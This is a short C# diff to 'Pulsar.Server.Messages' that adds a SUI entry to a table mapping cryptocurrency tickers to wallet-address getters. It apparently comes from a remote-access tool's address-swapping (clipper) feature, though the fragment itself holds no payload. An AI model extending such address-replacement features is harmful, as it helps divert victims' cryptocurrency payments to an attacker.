@@ -54,7 +54,8 @@ namespace Pulsar.Server.Messages
                     { "DASH", frm.GetDASHAddress },
                     { "XRP", frm.GetXRPAddress },
                     { "TRX", frm.GetTRXAddress },
-                    { "BCH", frm.GetBCHAddress }
+                    { "BCH", frm.GetBCHAddress },
+                    { "SUI", frm.GetSUIAddress }
                 };
 
                 if (!string.IsNullOrEmpty(message.Type) && addressGetters.TryGetValue(message.Type, out var getAddress))
